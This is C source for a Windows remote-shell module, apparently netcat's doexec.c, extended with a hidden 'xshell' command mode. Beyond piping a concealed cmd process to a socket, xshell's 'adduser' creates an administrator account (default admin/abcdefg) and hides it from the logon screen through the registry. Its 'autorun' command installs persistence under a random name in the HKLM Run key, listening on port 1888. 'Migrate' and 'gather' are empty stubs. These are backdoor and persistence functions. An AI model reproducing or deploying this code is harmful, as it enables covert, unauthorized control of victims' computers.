// for license see license.txt

// Modified 12/27/2004 by Chris Wysopal <weld@vulnwatch.com> 
// fixed vulnerability found by hat-squad

// portions Copyright (C) 1994 Nathaniel W. Mishkin
// code taken from rlogind.exe

#define _WIN32_WINNT 0x0500
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <shlwapi.h>

#ifdef GAPING_SECURITY_HOLE

#ifndef SHREGSET_HKCU
#define     SHREGSET_HKCU           0x00000001       // Write to HKCU if empty.
#define     SHREGSET_FORCE_HKCU     0x00000002       // Write to HKCU.
#define     SHREGSET_HKLM           0x00000004       // Write to HKLM if empty.
#define     SHREGSET_FORCE_HKLM     0x00000008       // Write to HKLM.
#define     SHREGSET_DEFAULT        (SHREGSET_FORCE_HKCU | SHREGSET_HKLM)          // Default is SHREGSET_FORCE_HKCU | SHREGSET_HKLM.
#endif

#define BUFFER_SIZE 200

extern char * pr00gie;
void holler(char * str, char * p1, char * p2, char * p3, char * p4, char * p5, char * p6);
char smbuff[20];
static int xshell_mode = 0;

//
// Structure used to describe each session
//
typedef struct {

	//
	// These fields are filled in at session creation time
	//
	HANDLE  ReadPipeHandle;         // Handle to shell stdout pipe
	HANDLE  WritePipeHandle;        // Handle to shell stdin pipe
	HANDLE  ProcessHandle;          // Handle to shell process

	//
	//
	// These fields are filled in at session connect time and are only
	// valid when the session is connected
	//
	SOCKET  ClientSocket;
	HANDLE  ReadShellThreadHandle;  // Handle to session shell-read thread
	HANDLE  WriteShellThreadHandle; // Handle to session shell-read thread

} SESSION_DATA, *PSESSION_DATA;


//
// Private prototypes
//

static HANDLE
	StartShell(
	HANDLE StdinPipeHandle,
	HANDLE StdoutPipeHandle
	);

static VOID
	SessionReadShellThreadFn(
	LPVOID Parameter
	);

static VOID
	SessionWriteShellThreadFn(
	LPVOID Parameter
	);



// **********************************************************************
//
// CreateSession
//
// Creates a new session. Involves creating the shell process and establishing
// pipes for communication with it.
//
// Returns a handle to the session or NULL on failure.
//

static PSESSION_DATA
	CreateSession(
	VOID
	)
{
	PSESSION_DATA Session = NULL;
	BOOL Result;
	SECURITY_ATTRIBUTES SecurityAttributes;
	HANDLE ShellStdinPipe = NULL;
	HANDLE ShellStdoutPipe = NULL;

	//
	// Allocate space for the session data
	//
	Session = (PSESSION_DATA) malloc(sizeof(SESSION_DATA));
	if (Session == NULL) {
		return(NULL);
	}

	//
	// Reset fields in preparation for failure
	//
	Session->ReadPipeHandle  = NULL;
	Session->WritePipeHandle = NULL;


	//
	// Create the I/O pipes for the shell
	//
	SecurityAttributes.nLength = sizeof(SecurityAttributes);
	SecurityAttributes.lpSecurityDescriptor = NULL; // Use default ACL
	SecurityAttributes.bInheritHandle = TRUE; // Shell will inherit handles

	Result = CreatePipe(&Session->ReadPipeHandle, &ShellStdoutPipe,
		&SecurityAttributes, 0);
	if (!Result) {
		holler("Failed to create shell stdout pipe, error = %s",
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);
		goto Failure;
	}
	Result = CreatePipe(&ShellStdinPipe, &Session->WritePipeHandle,
		&SecurityAttributes, 0);

	if (!Result) {
		holler("Failed to create shell stdin pipe, error = %s",  
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);
		goto Failure;
	}
	//
	// Start the shell
	//
	Session->ProcessHandle = StartShell(ShellStdinPipe, ShellStdoutPipe);

	//
	// We're finished with our copy of the shell pipe handles
	// Closing the runtime handles will close the pipe handles for us.
	//
	CloseHandle(ShellStdinPipe);
	CloseHandle(ShellStdoutPipe);

	//
	// Check result of shell start
	//
	if (Session->ProcessHandle == NULL) {
		holler("Failed to execute shell", NULL,
			NULL, NULL, NULL, NULL, NULL);

		goto Failure;
	}

	//
	// The session is not connected, initialize variables to indicate that
	//
	Session->ClientSocket = INVALID_SOCKET;

	//
	// Success, return the session pointer as a handle
	//
	return(Session);

Failure:

	//
	// We get here for any failure case.
	// Free up any resources and exit
	//

	if (ShellStdinPipe != NULL) 
		CloseHandle(ShellStdinPipe);
	if (ShellStdoutPipe != NULL) 
		CloseHandle(ShellStdoutPipe);
	if (Session->ReadPipeHandle != NULL) 
		CloseHandle(Session->ReadPipeHandle);
	if (Session->WritePipeHandle != NULL) 
		CloseHandle(Session->WritePipeHandle);

	free(Session);

	return(NULL);
}



BOOL
	doexec(
	SOCKET  ClientSocket
	)
{
	PSESSION_DATA   Session = CreateSession();
	SECURITY_ATTRIBUTES SecurityAttributes;
	DWORD ThreadId;
	HANDLE HandleArray[3];
	int i;

	SecurityAttributes.nLength = sizeof(SecurityAttributes);
	SecurityAttributes.lpSecurityDescriptor = NULL; // Use default ACL
	SecurityAttributes.bInheritHandle = FALSE; // No inheritance

	//
	// Store the client socket handle in the session structure so the thread
	// can get at it. This also signals that the session is connected.
	//
	Session->ClientSocket = ClientSocket;

	//
	// Create the session threads
	//
	Session->ReadShellThreadHandle = 
		CreateThread(&SecurityAttributes, 0,
		(LPTHREAD_START_ROUTINE) SessionReadShellThreadFn, 
		(LPVOID) Session, 0, &ThreadId);

	if (Session->ReadShellThreadHandle == NULL) {
		holler("Failed to create ReadShell session thread, error = %s", 
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);

		//
		// Reset the client pipe handle to indicate this session is disconnected
		//
		Session->ClientSocket = INVALID_SOCKET;
		return(FALSE);
	}

	Session->WriteShellThreadHandle = 
		CreateThread(&SecurityAttributes, 0, 
		(LPTHREAD_START_ROUTINE) SessionWriteShellThreadFn, 
		(LPVOID) Session, 0, &ThreadId);

	if (Session->WriteShellThreadHandle == NULL) {
		holler("Failed to create ReadShell session thread, error = %s", 
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);

		//
		// Reset the client pipe handle to indicate this session is disconnected
		//
		Session->ClientSocket = INVALID_SOCKET;

		TerminateThread(Session->WriteShellThreadHandle, 0);
		return(FALSE);
	}

	//
	// Wait for either thread or the shell process to finish
	//

	HandleArray[0] = Session->ReadShellThreadHandle;
	HandleArray[1] = Session->WriteShellThreadHandle;
	HandleArray[2] = Session->ProcessHandle;


	i = WaitForMultipleObjects(3, HandleArray, FALSE, 0xffffffff);


	switch (i) {
	case WAIT_OBJECT_0 + 0:
		TerminateThread(Session->WriteShellThreadHandle, 0);
		TerminateProcess(Session->ProcessHandle, 1);
		break;

	case WAIT_OBJECT_0 + 1:
		TerminateThread(Session->ReadShellThreadHandle, 0);
		TerminateProcess(Session->ProcessHandle, 1);
		break;
	case WAIT_OBJECT_0 + 2:
		TerminateThread(Session->WriteShellThreadHandle, 0);
		TerminateThread(Session->ReadShellThreadHandle, 0);
		break;

	default:
		holler("WaitForMultipleObjects error: %s", 
			itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);

		break;
	}


	// Close my handles to the threads, the shell process, and the shell pipes
	shutdown(Session->ClientSocket, SD_BOTH);
	closesocket(Session->ClientSocket);

	DisconnectNamedPipe(Session->ReadPipeHandle);
	CloseHandle(Session->ReadPipeHandle);

	DisconnectNamedPipe(Session->WritePipeHandle);
	CloseHandle(Session->WritePipeHandle);


	CloseHandle(Session->ReadShellThreadHandle);
	CloseHandle(Session->WriteShellThreadHandle);

	CloseHandle(Session->ProcessHandle);

	free(Session);

	return(TRUE);
}


// **********************************************************************
//
// StartShell
//
// Execs the shell with the specified handle as stdin, stdout/err
//
// Returns process handle or NULL on failure
//

static HANDLE
	StartShell(
	HANDLE ShellStdinPipeHandle,
	HANDLE ShellStdoutPipeHandle
	)
{
	PROCESS_INFORMATION ProcessInformation;
	STARTUPINFO si;
	HANDLE ProcessHandle = NULL;

	//
	// Initialize process startup info
	//
	si.cb = sizeof(STARTUPINFO);
	si.lpReserved = NULL;
	si.lpTitle = NULL;
	si.lpDesktop = NULL;
	si.dwX = si.dwY = si.dwXSize = si.dwYSize = 0L;
	si.wShowWindow = SW_HIDE;
	si.lpReserved2 = NULL;
	si.cbReserved2 = 0;

	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

	si.hStdInput  = ShellStdinPipeHandle;
	si.hStdOutput = ShellStdoutPipeHandle;

	DuplicateHandle(GetCurrentProcess(), ShellStdoutPipeHandle, 
		GetCurrentProcess(), &si.hStdError,
		DUPLICATE_SAME_ACCESS, TRUE, 0);

	if (CreateProcess(NULL, pr00gie, NULL, NULL, TRUE, 0, NULL, NULL,
		&si, &ProcessInformation)) 
	{
		ProcessHandle = ProcessInformation.hProcess;
		CloseHandle(ProcessInformation.hThread);
	} 
	else 
		holler("Failed to execute shell, error = %s", 
		itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);


	return(ProcessHandle);
}


// **********************************************************************
// SessionReadShellThreadFn
//
// The read thread procedure. Reads from the pipe connected to the shell
// process, writes to the socket.
//

static VOID
	SessionReadShellThreadFn(
	LPVOID Parameter
	)
{
	PSESSION_DATA Session = Parameter;
	BYTE    Buffer[BUFFER_SIZE];
	BYTE    Buffer2[BUFFER_SIZE*2+30];
	DWORD   BytesRead;

	// srand((unsigned int)time(NULL));

	// this bogus peek is here because win32 won't let me close the pipe if it is
	// in waiting for input on a read.
	while (PeekNamedPipe(Session->ReadPipeHandle, Buffer, sizeof(Buffer), 
		&BytesRead, NULL, NULL)) 
	{
		DWORD BufferCnt, BytesToWrite;
		BYTE PrevChar = 0;

		if (BytesRead > 0)
		{
			ReadFile(Session->ReadPipeHandle, Buffer, sizeof(Buffer), 
				&BytesRead, NULL);
		}
		else
		{
			Sleep(50);
			continue;
		}



		//
		// Process the data we got from the shell:  replace any naked LF's
		// with CR-LF pairs.
		//
		for (BufferCnt = 0, BytesToWrite = 0; BufferCnt < BytesRead; BufferCnt++) {
			if (Buffer[BufferCnt] == '\n' && PrevChar != '\r')
				Buffer2[BytesToWrite++] = '\r';
			PrevChar = Buffer2[BytesToWrite++] = Buffer[BufferCnt];
		}

		if (send(Session->ClientSocket, Buffer2, BytesToWrite, 0) <= 0) 
			break;
	}

	if (GetLastError() != ERROR_BROKEN_PIPE)
		holler("SessionReadShellThreadFn exitted, error = %s", 
		itoa(GetLastError(), smbuff, 10), NULL, NULL, NULL, NULL, NULL);

	ExitThread(0);
}

static void xshell(int s);

// **********************************************************************
// SessionWriteShellThreadFn
//
// The write thread procedure. Reads from socket, writes to pipe connected
// to shell process.  


static VOID
	SessionWriteShellThreadFn(
	LPVOID Parameter
	)
{
	PSESSION_DATA Session = Parameter;
	BYTE    RecvBuffer[1];
	BYTE    Buffer[BUFFER_SIZE];
	DWORD   BytesWritten;
	DWORD   BufferCnt;

	srand((unsigned int)time(NULL));

	BufferCnt = 0;

	//
	// Loop, reading one byte at a time from the socket.    
	//
	while (recv(Session->ClientSocket, RecvBuffer, sizeof(RecvBuffer), 0) > 0) {

		Buffer[BufferCnt++] = RecvBuffer[0];
		if (RecvBuffer[0] == '\r')
			Buffer[BufferCnt++] = '\n';


		// Trap exit as it causes problems
		if (BufferCnt == 6 && strnicmp(Buffer, "exit\r\n", 6) == 0)
			ExitThread(0);

		// xshell entry
		if (BufferCnt == 7 && strnicmp(Buffer, "xshell\n", 7) == 0) {
			xshell(Session->ClientSocket);
			Buffer[0] = RecvBuffer[0] = '\n';
			BufferCnt = 1;
		}

		//
		// If we got a CR, it's time to send what we've buffered up down to the
		// shell process.
		// SECURITY FIX: CW 12/27/04 Add BufferCnt size check.  If we hit end of buffer, flush it
		if (RecvBuffer[0] == '\n' || RecvBuffer[0] == '\r' || BufferCnt > BUFFER_SIZE-1) {
			if (! WriteFile(Session->WritePipeHandle, Buffer, BufferCnt, 
				&BytesWritten, NULL))
			{
				break;
			}
			BufferCnt = 0;
		}
	}

	ExitThread(0);
}

///////////////////////////////////////////////////////////////////////////
// xshell
static int xshell_printf(int s, char* fmt, ...)
{
	char buf[4096];
	va_list ap;
	int len, r;
	va_start(ap, fmt);
	len = vsnprintf(buf, sizeof(buf) - 1, fmt, ap);
	va_end(ap);
	buf[sizeof(buf) - 1] = 0;
	r = send(s, buf, len, 0);
	if (r <= 0)
		return -1;

	return r;
}

static int xshell_readline(int s, char* line, size_t len)
{
	char buf;
	int r, pos = 0;
	if (len < 2)
		return -1;

	while (1) {
		r = recv(s, &buf, sizeof(buf), 0);
		if (r <= 0)
			return -1;
		if (pos + 1 < (len - 2)) {
			if (buf == '\n') {
				line[pos] = 0;
				return pos;
			}

			line[pos ++] = buf;

		} else {
			line[len - 2] = '\n';
			line[len - 1] = 0;
			return len;
		}
	}

	return -1;
}

static int parse_cmd(char* cmdline, int* argc, char** argv)
{
	int n = 0;
	char* tok = strtok(cmdline, " ");
	while (tok) {
		argv[n ++] = tok;
		tok = strtok(NULL, " ");
	}

	if (n < 1)
		return -1;
	*argc = n;
	return 0;
}

typedef int (*cmd_handler)(int s, int arg, char* argv[]);

static int def_handler(int s, int argc, char* argv[])
{
	xshell_printf(s, "unknown command: %s\n", argv[0]);
	return 0;
}

static int help_handler(int s, int argc, char* argv[])
{
	xshell_printf(s, "help command\n");
	return 0;
}

static int getpid_handler(int s, int argc, char* argv[])
{
	xshell_printf(s, "%d\n", GetCurrentProcessId());
	return 0;
}

static const char* get_exe_name()
{
	static char exename[MAX_PATH + 1] = {0};
	if (exename[0] == 0) {
		GetModuleFileName(NULL, exename, MAX_PATH);
	}

	return exename;
}

static const char* get_randon_str()
{
	static char buf[32];
	int i;
	int n = 5 + rand() % 6;
	
	for (i = 0; i < n ; i ++) {
		buf[i] = 'a' + (rand() % 26);
	}
	buf[n] = 0;
	return buf;
}

static int adduser_handler(int s, int argc, char* argv[])
{
	char cmd[256];
	const char* user = "admin";
	const char* passwd = "abcdefg";
	HUSKEY hKey;
	DWORD v = 0;

	if (argc > 1)
		user = argv[1];
	if (argc > 2)
		passwd = argv[2];
	
	sprintf(cmd, "net user %s %s /add", user, passwd);
	if (system(cmd) == 0) {
		sprintf(cmd, "net localgroup administrators %s /add", user);
		if (system(cmd) != 0)
			xshell_printf(s, "Cannot add %s to administators\n", user);
	} else {
		xshell_printf(s, "Cannot add user: %s\n", user);
		return -1;
	}

	SHRegCreateUSKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", 
		KEY_WRITE, NULL, &hKey, SHREGSET_HKLM);
	if (hKey) {
		SHRegWriteUSValue(hKey, user, REG_DWORD, &v, sizeof(v), SHREGSET_FORCE_HKLM);
		SHRegCloseUSKey(hKey);
		xshell_printf(s, "Succecced\n");
	} else {
		xshell_printf(s, "Failed\n");
	}
	return 0;
}

struct _handlers {
	char* cmd;
	cmd_handler handler;
};

static int autorun_handler(int s, int argc, char* argv[])
{
	const char* name, *regv;
	char cmd[MAX_PATH];
	char type = 'B';
	int port = 1888;
	HUSKEY hKey;
	if (argc > 1) {
		type = argv[1][0];
		if (type != 'b' && type != 'B')
			type = 'B';
	}

	if (argc > 2) {
		port = atoi(argv[2]);
	}

	SHRegCreateUSKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
		KEY_WRITE, NULL, &hKey, SHREGSET_HKLM);
	if (hKey) {
		name = get_exe_name();
		regv = get_randon_str();
		sprintf(cmd, "%s -%c %d", name, type, port);
		SHRegWriteUSValue(hKey, regv, REG_SZ, cmd, strlen(cmd), SHREGSET_FORCE_HKLM);
		SHRegCloseUSKey(hKey);
		xshell_printf(s, "Succecced. Name: %s\n", regv);
	} else {
		xshell_printf(s, "Failed\n");
	}

	return 0;
}

static int migrate_handler(int s, int argc, char* argv[])
{
	// attach/create a process, and impersonate it
	const char* exename = "mmc.exe";
	DWORD pid = 0;
	if (argc > 1)
		exename = argv[1];
	pid = atol(exename);
	if (pid == 0) {
		// create process
	} else {
		// attach process
	}

	return 0;
}

static int gather_handler(int s, int argc, char* argv[])
{
	return 0;
}

struct _handlers handlers[] = {
	{"help", help_handler}, 
	{"adduser", adduser_handler}, 
	{"getpid", getpid_handler}, 
	{"autorun", autorun_handler}, 
	{"migrate", migrate_handler},  
	{"gather", gather_handler},  
};

cmd_handler find_cmd_handler(char* name)
{
	int i;
	for (i = 0; i < sizeof(handlers) / sizeof(handlers[0]); i ++) {
		if (strcmp(handlers[i].cmd, name) == 0)
			return handlers[i].handler;
	}

	return def_handler;
}

static void xshell(int s)
{
	char cmd[1024];
	int argc;
	char* argv[32];
	xshell_mode = 1;
	while (1) {
		xshell_printf(s, "(XSHELL)");
		xshell_readline(s, cmd, sizeof(cmd));
		if (parse_cmd(cmd, &argc, (char **)&argv) != 0) {
			xshell_printf(s, "invalid command\n");
			continue;
		}

		if (strcmp(argv[0], "exit") == 0)
			break;

		(*find_cmd_handler(argv[0]))(s, argc, argv);
	}

	xshell_mode = 1;
}

#endif
